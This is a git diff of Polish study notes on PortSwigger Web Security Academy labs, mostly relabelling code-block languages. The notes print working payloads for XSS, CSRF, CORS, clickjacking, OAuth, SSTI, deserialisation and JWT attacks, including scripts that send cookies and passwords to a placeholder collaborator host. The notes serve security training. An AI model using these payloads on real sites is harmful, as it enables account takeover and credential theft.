@@ -207,7 +207,7 @@ ${alert(document.domain)}
 ## Lab: Reflected XSS into HTML context with all tags blocked except custom ones
 1. Właściwość `onfocus` aktywowana jest w momencie gdy zostanie wysłane zapyatbnie na url: `domena.com#<id_elementu>`
 2. Działa ona dla części elementów ale nie wszystkich, dodają jednak atrybut `tabindex=1` (wartość dowolna), działa dla właściwie wszystkich elementów, nawet customowych: 
-```html
+```js
 <iframe src=https://0a5e00cc038379a4c0305dd6005200b1.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert(document.cookie)+id%3Dx+tabindex%3D1%3E#x></iframe>
 
 // <iframe src=https://0a5e00cc038379a4c0305dd6005200b1.web-security-academy.net/?search=<xss onfocus=alert(document.cookie) id=x tabindex=1>#x></iframe>
@@ -225,20 +225,6 @@ https://0a71005c041e3653c08e355d00090032.web-security-academy.net/post?postId=4&
 1. W komentzrzu nie ma rzadniej ochrony przed XSSem, więc możemy dać daowolny skrypt.
 2. Do zmiany maila potrzebny jest jednak token csrf, który zczytujemy ze strony.
 3. Dodajemy setTimeout, aby funkcja wywołała się po sekundzie, kiedy już wszystkie elementy na stronie się załadują.
-```js
-<script>
-    function sendd() {
-        var a = document.getElementsByName("csrf")[0].value;
-        let aaa = new XMLHttpRequest();
-        aaa.open("POST", "https://0a5f00a4035e62ccc0fe0e37006b00ea.web-security-academy.net/my-account/change-email");
-
-        aaa.send("email=test@test.test&csrf=" + a);
-    };
-
-    setTimeout(sendd, 1000)
-</script>
-```
-
 ```html
 <script>
     function sendd() {
@@ -255,7 +241,7 @@ https://0a71005c041e3653c08e355d00090032.web-security-academy.net/post?postId=4&
 
 ## Lab: Exploiting cross-site scripting to steal cookies
 1. W komentarzu wpisujemy
-```
+```html
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 method: 'POST',
@@ -266,7 +252,7 @@ body:document.cookie
 ```
 
 ## Lab: Exploiting cross-site scripting to capture passwords
-```
+```html
 <input name=username id=username>
 <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
 method:'POST',
@@ -281,15 +267,15 @@ Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą od
 - Wtedy użyć można <frame> albo <img>
 
 Jeżeli mamy on hashchange to można użyć:
-```
+```html
 <iframe src="https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"> 
 ```
 jak exploit, albo
-```
+```url
 https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#<img src=1 onerror=print()>
 ```
 Jeżeli mamy payload do Angulara, to warto sobie poszukać pod konkretny framework:
-```
+```angular
 {{$on.constructor('alert(1)')()}}
 ```
 
@@ -302,19 +288,19 @@ Jeżeli mamy payload do Angulara, to warto sobie poszukać pod konkretny framewo
 
 ## Lab: Reflected DOM XSS
 1. Patrzymy na zwracaną wartość:
-```
+```json
 {"results":[],"searchTerm":"podana_wartość"}
 ```
 2. Widzimy jakie znaki są escapowane, podajemy wartość:
-```
+```js
 \"-alert(1)}//
 ```
 3. Co zamienia się w:
-```
+```js
 "\\"-alert(1)}//"
 ```
 i mamy:
-```
+```json
 {"searchTerm":"\\"-alert(1)}//", "results":[]}
 ```
 
@@ -323,7 +309,7 @@ i mamy:
 
 ## Lab: CSRF vulnerability with no defenses
 ### Skrypt zmieniający adres e-mail:
-```
+```html
     <html>
         <body>
             <form action="https://0ac4006304f120fbc02b4be100cd00c7.web-security-academy.net/my-account/change-email" method="POST">
@@ -339,7 +325,7 @@ i mamy:
 1. Generujemy CSRF dal użytkownika, wysyłając zapyanie o zmiane maila, zapisujemy je i dropujemy request
 2. Sprawdzamy na drugim użytkowniku że podniana jego tokenu na ten działa
 3. robimy skrypt, który uruchamia zminae maila z dodanym wcześniej wygenerowanym tokenem
-```
+```html
     <html>
         <body>
             <form action="https://0a7400fb04acc082c085a8ac00ef0031.web-security-academy.net/my-account/change-email" method="POST">
@@ -358,7 +344,7 @@ i mamy:
 ## Lab:CSRF token is tied to a non-session cookie
 1. Jeśli mamy do zmiany dwa parametry warto użyć
 `<img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">`, bo wtedy mamy pewność, że zapytania wykonają się w odpowiedniej kolejności
-```
+```html
     <html>
         <body>
             <form action="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/my-account/change-email" method="POST">
@@ -373,7 +359,7 @@ i mamy:
 ## Lab: CSRF where Referer validation depends on header being present 
 1. Z racji, że po usunięciu nagłówka Referer pomijane jest jego sprawdzenie, to należy dodać `<meta name="referrer" content="never">`, który informuje stronę, any takiego nagłówka nie dodawać
 2. Cały payhload wygląda tak:
-``` 
+```html
     <html>
         <body>
             <meta name="referrer" content="never">
@@ -398,7 +384,7 @@ i mamy:
 ## Lab: CORS vulnerability with basic origin reflection
 1. Dopuszczalne jest zapytanie z każdej strony
 2. Wystarczy zatem skonstruować taki skrypt:
-```
+```html
     <script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
@@ -416,7 +402,7 @@ i mamy:
 1. Wpisując różne Origin do requesta widzimy że dostajemy nagłówek `Access-Control-Allow-Origin: null` dla wartości Origin: null
 2. WAŻNE: to że dostajemy odpowiedź nic nie znaczy, ważne jest żeby był nagłówek, bo nie chodzi o to że będzie blokowany request, a wykonywanie skryptów i przekierowanie cookie
 3. Aby w Origin uzyskać wartość null używamy iframe:
-```
+```html
     <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
@@ -438,7 +424,7 @@ i mamy:
 4. Konstruujemy skrypt i dodajemy do na exploit server:
 
 Payload:
-```
+```html
     <script>
         document.location="http://stock.0a100003032beefac0af231c00de0028.web-security-academy.net/?productId=4
     	<script>
@@ -457,7 +443,7 @@ Payload:
 ```
 
 # CLICKJACKING
-```
+```html
     <head>
     	<style>
     		iframe {
@@ -476,7 +462,7 @@ Payload:
     	</style>
     </head>
 ```
-```
+```html
     <body>
             <div>
             <button>click</button>
@@ -485,7 +471,7 @@ Payload:
     </body>
 ```
 Jeśli strona blokuje odpalanie jej w framie pomóc może dodanie sandbox="allow-forms":
-```
+```html
 <iframe src="https://0a3d000a04b97a33c050232a0098006e.web-security-academy.net/my-account" sandbox="allow-forms"> </iframe>
 ```
 
@@ -493,20 +479,20 @@ Jeśli strona blokuje odpalanie jej w framie pomóc może dodanie sandbox="allow
 # DOM-based vunabilities
 
 ## Web messages
-```
+```html
 <iframe src="https://0ad400b70311a7c0c07419ee0014008f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 ```
 	
 ## Lab: DOM XSS using web messages and a JavaScript URL
 1. Widzimy, że stroma pobiera wartość message i sprawdza, czy zawiera http: lub https:, jeśli tak wpisuje ją do href, jeśli nie to nie:
 2. Konstruujem zatem payload, który zawiera wywołanie funkcji print, a także słowo http, które poprzedzamy //, aby był to komentarz:
-```
+```html
 <iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 ```
 
 ## Lab: DOM XSS using web messages and JSON.parse
 1. Jest to przykład z użyciem JSON.parse, który zmienia string w JSON, należy pamiętać, aby escapować znaki " w stringu, bo inaczej zrobią się z tego osobne stringi i nie zadziała
-```
+```html
 <iframe src="https://0ab200c5041cbdb3c018c71b008d0084.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*")'>
 ```
 
@@ -522,7 +508,7 @@ https://0aff009b03b537c9c039ad9c00ff0051.web-security-academy.net/post?postId=7#
 	- następnie robimy redirect, wtedy załaduje się link do przycisku, a tym samym wykona się skrypt
 
 Payload:
-```
+```html
 <iframe  width=1000px height=1000px src="https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="window.location.href = 'https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/';">
 ```
 
@@ -531,7 +517,7 @@ Payload:
 
 # INSECURE DESERIALISATION
 ## PHP
-```
+```php
 String -> s:size:value;
 Integer -> i:value;
 Boolean ->b:value; (does not store "true" or "false", does store '1' or '0')
@@ -540,7 +526,7 @@ Array -> a:size:{key definition;value definition;(repeated per element)}
 Object -> O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}
 ```
 ## Java
-```
+```cmd
 java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > file.txt
 ```
 - tworzy dane zserializowane wykonujące daną komendę
@@ -564,13 +550,13 @@ http://vulnerable-website.com/?username=${7*7}
 ```
 ## Payloady:
 ### Freemaker
-```
+```freemaker
 <%= system("rm morale.txt") %> -> RUBY ERC
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} -> Freemaker
 ```
 
 ### handlebars
-```
+```handlebars
     wrtz{{#with "s" as |string|}}
         {{#with "e"}}
             {{#with split as |conslist|}}
@@ -593,7 +579,7 @@ http://vulnerable-website.com/?username=${7*7}
 ```
 
 ### django
-```
+```python
 {{settings.SECRET_KEY}} -> django
 {% debug %} -> django
 ```
@@ -750,7 +736,7 @@ param=bad-stuff-here
 3. Musimy zatem stworzyć payload, którym administrator połączy nasze konto (z mediów społecznościowych) ze swoim na stronie
 4. Przechodzimy znowu do łacznia konta z kontem z mediami połecznościowymi i dochodzimy do momentu, gdzie mamy wygenerowane i pokazane client_id, jest to id klienta, z którego kontem będzie połączone konto z MS, nie ma tokenu CSRF (w OAuth jest to parametr `state`), a zatem i ochrony przed takim atakiem
 5. W tym momencie dropujemy request, aby kod client_id nie został zużyty i link przesyłamy do ofiary w następującej formie:
-```
+```html
 <iframe src="https://0a4d004f04cb3a63c0382da90041006d.web-security-academy.net/oauth-linking?code=aKsHIS3bGFzKEN-EDD0918bQIjTaeSLtw0mmnW4v8e8"> </iframe>
 ```
 6. Następnie logujemy się przez konto społecznościowe i zostajemy przekierowani na konto administracyjne, skąd usuwamy carlosa
@@ -763,7 +749,7 @@ param=bad-stuff-here
 5. Wysyłając poprzednie zapytanie do Burp Reapeatera możemy zauważyć, że [strona] jest pobierana z wysyłanej wartości redirect_uri
 6. Konstruujemy zatem payload, jest to to samo zapytanie jednak z podmienioną wartością redirect_uri wskazującą na nasz serwer, przez co zostanie wysłane na niego zapytanie z wartością token u
 7. Payload
-```
+```html
 <iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
 ```
 8. Przechodzimy przez qproces logowania i w momencie zapytanie z `/oauth-callback` podmieniamy tokeny
@@ -775,7 +761,7 @@ param=bad-stuff-here
 4. Przekierowujemy na `/post/next?path=`, który z kolei przekierowuje na podaną stronę (już dowolną)
 5. Niestety dodawane informacje, których potzrzbujemy są za znakiem `#`, a zatem nie zapiszą się w logach serwera
 6. Musimy zatem skonstruować skrypt, który najpierw wyśle zapytanie do oauth, któte przekierowane zosatnie na nasz serwer, a następnie serwer zczyta co jest po znaku hash i wykona kolejne zapytanie z tym parametrem.
-```
+```html
 <script>
     if (!document.location.hash) {
         window.location = 'https://oauth-0a930074048a7ca5c028216602a40079.web-security-academy.net/auth?client_id=rl0ntdjn6bqcnz7xs70sj&redirect_uri=https://0a26001304507c97c09221c800690068.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac900f304657c41c078211801e000bf.web-security-academy.net/exploit&response_type=token&nonce=-576275628&scope=openid%20profile%20email'
@@ -790,12 +776,12 @@ param=bad-stuff-here
 # JWT
 
 ## Konstrukcja JWT
-```
+```jwt
 eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
 
 header_base64.payload_base64.signature
 ```
-```
+```json
 Header decoded:
 {
     "kid":"9136ddb3-cb0a-4a19-a07e-eadf5a44c8b5",
@@ -826,7 +812,7 @@ Payload decoded:
 1. Logujemy się i znajdujemy JWT, do panelu administracyjnego możemy dostać się poprzez konto administratora
 2. Wystarczy zmienić nazwę użytkownika w JWT oraz podpisać je odpowiednim kluczem
 3. Aby poznać klucz musimy złamać klucz używamy listy popularnych kluczy: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list oraz hashcata:
-```
+```cmd
 hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 ```
 4. Znajdujemy klucz `secret1` i importujemy go do `JWT Editora`:
@@ -836,7 +822,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 ## Lab: JWT authentication bypass via jwk header injection
 Nagłówek JWK mówi serwerowi jaki klucz powinien zostać użyty do sprawdzenia podpisu w wiadomości. Przykład takiego nagłówka:
-```
+```json
 {
     "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
     "typ": "JWT",
@@ -857,7 +843,7 @@ Zasadniczo powinna istnieć white-lista kluczy, których może używać serwer, 
 
 ## Lab: JWT authentication bypass via jku header injection
 Pole `jku` w JWT zawiera link do strony z kluczami, które należy użyć do weryfikacji podpisu. Jeśli nie jest ona odpowiednio weryfikowana można to wykorzystać do podania własnego klucza. Klucze są zapisane w takiej formie:
-```
+```json
 {
     "keys": [
 	{
@@ -872,7 +858,7 @@ Pole `jku` w JWT zawiera link do strony z kluczami, które należy użyć do wer
 ```
 1. Tworzymy parę kluczy RSA
 2. Pobieramy klucz publiczny w formie JWT i kopiujemy go na exploit serwer w takiej formie:
-```
+```json
 {
     "keys": [
         {
@@ -885,7 +871,7 @@ Pole `jku` w JWT zawiera link do strony z kluczami, które należy użyć do wer
 }
 ```
 3. Dodajemy w nagłówku payloadu link do strony w polu `jku` (należy je stworzyć)
-```
+```json
 {
     "alg": "RS256",
     "jku": "https://exploit-0ab400e40452efd5c0cf7ab4012d00c5.web-security-academy.net/exploit"
@@ -899,7 +885,7 @@ W polu `kid` w JWT podawane jest id klucza, może być to także ścieżka do ni
 1. Tworzymy klucz symetryczny o wartości zakodowanego w base64 znaku null (`AA==`)
 2. Tworzymy zapytanie na `/admin` i przesyłamy do reapeatera.
 3. W JWT zmieniamy nazwę użytkownika na administrator, a w polu `kid` dajemy ścieżkę do `/dev/null`, ponieważ wiadomo, że ten plik jest pusty, a zatem zapytanie do niego zwróci wartość null 
-```
+```json
 {
     "kid": "../../../../../../../../../../../../dev/null",
     "alg": "HS256"
@@ -910,7 +896,7 @@ Dajemy dużo `../` ponieważ chemy się cofnąć do najniższego katalogu, a zby
 
 ## Lab: JWT authentication bypass via algorithm confusion
 Czasami pomimo tego, że serwer używa do weryfikacji tylko kryptografii asymetrycznej w kodzie znajduje się taki sam rodzaj weryfikacji, tylko z kluczem symetrycznym (zostaje to zostawione z gotowej implementacji).
-```
+```js
 function verify(token, secretOrPublicKey){
     algorithm = token.getAlgHeader();
     if(algorithm == "RS256"){
@@ -921,7 +907,7 @@ function verify(token, secretOrPublicKey){
 }
 ```
 Z racji, że zakładane jest, że użyta zostanie jedynie kryptografia asymetryczna, klucz publiczny jest zakodowany w pliku.
-```
+```js
 publicKey = <public-key-of-server>;
 token = request.getCookie("session");
 verify(token, publicKey);
@@ -944,11 +930,11 @@ Zadanie bliźnieacze do poprzedniego, ale klucz nie jest publiczny.
 3. Za pomocą programu sig2n dodając jako atgumenty dwa znalezione JWT dostajemy potencjalne klucze wraz z podpisanymi payloadami.
 
 Komenda:
-```
+```cmd
 docker run --rm -it portswigger/sig2n <token1> <token2>
 ```
 Wynik:
-```
+```base64
 Found n with multiplier 1:
 
     Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzN1dmSGpsaWxJQUo4U3h2Z2FDOQpDK0VhSDF0RG1PYVV3V2hWSDJibUV1eE1RVFpFSEZPSWl1S2pYbU1TeFU0UzR6T0JDQVM0VnRuTGFrYnlBVVNaCk40Wmg0d2RNa1BTdDlkNDEzdnpwSFVtR2p2TTNRdGZ6d3lEb3dVQlVWa0pGWFFKN1FmZmE5NTNMZjdNYndTbkYKYklUOFN2UDdLcVF3c1hzZ1VHWnRqdnFIMkFGVXZtRlJ4TjIzRjdrRU9LdXdjYW1Bbk9LZFN5aGRSai9iSFhmWgpUY0k2VERZcjE3M1dxWlVxT2RQYlpCczNMdFdleGNiSmc1N0xHQyt0SWttRXFzZ2g5U0NhMEFOc2RtcXJQTTNnCjA3OThXMmpydWNJTnV1UGZod0pvampKTlhYTjZpeXh4RFZhV0kwT0RURGpnaTl2OVR5WmFWSUo5UmxEbmFnQzUKbVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
@@ -1070,7 +1056,7 @@ Foo: x
 ## Lab: Client-side desync
 
 Exploit
-```
+```html
 <script>
 fetch('https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net/', {
     method: 'POST',
